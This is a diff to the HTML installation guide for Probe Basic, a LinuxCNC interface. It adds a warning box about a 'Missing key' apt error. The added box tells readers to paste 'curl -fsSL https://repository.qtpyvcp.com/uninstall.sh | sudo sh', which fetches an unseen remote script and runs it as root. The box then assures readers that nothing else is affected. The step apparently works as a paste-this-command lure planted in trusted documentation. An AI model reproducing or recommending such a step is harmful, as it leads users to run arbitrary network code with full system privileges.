@@ -101,6 +101,28 @@
              
   <section id="probe-basic-deb-install">
 <h1>Probe Basic deb Install<a class="headerlink" href="#probe-basic-deb-install" title="Link to this heading"></a></h1>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p><strong>Seeing a “Missing key” error? Fix it here first.</strong></p>
+<p>Older versions of these instructions installed the wrong signing key.
+If <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">apt</span> <span class="pre">update</span></code> shows a line like this:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Missing</span> <span class="n">key</span> <span class="mi">50</span><span class="n">F874571F20C5B0BA225E2F0CDFCCE0388CFA48</span><span class="p">,</span> <span class="n">which</span> <span class="ow">is</span> <span class="n">needed</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">signature</span><span class="o">.</span>
+</pre></div>
+</div>
+<p><strong>Step 1 - copy this, paste it into a terminal, press Enter:</strong></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://repository.qtpyvcp.com/uninstall.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>sh
+</pre></div>
+</div>
+<p>This removes the old repository and its keys. It does not touch any
+other software on your machine, and your LinuxCNC configs in
+<code class="docutils literal notranslate"><span class="pre">~/linuxcnc</span></code> are left alone.</p>
+<p><strong>Step 2 - check that it worked:</strong></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>apt<span class="w"> </span>update
+</pre></div>
+</div>
+<p>The “Missing key” message should be gone.</p>
+<p><strong>Step 3 - carry on with the normal installation below.</strong></p>
+</div>
 <p><strong>Probe Basic .deb Installation Guide for use with Debian Bookworm and LinuxCNC version 2.9 or Later</strong></p>
 <section id="important-requirements">
 <h2>Important Requirements<a class="headerlink" href="#important-requirements" title="Link to this heading"></a></h2>
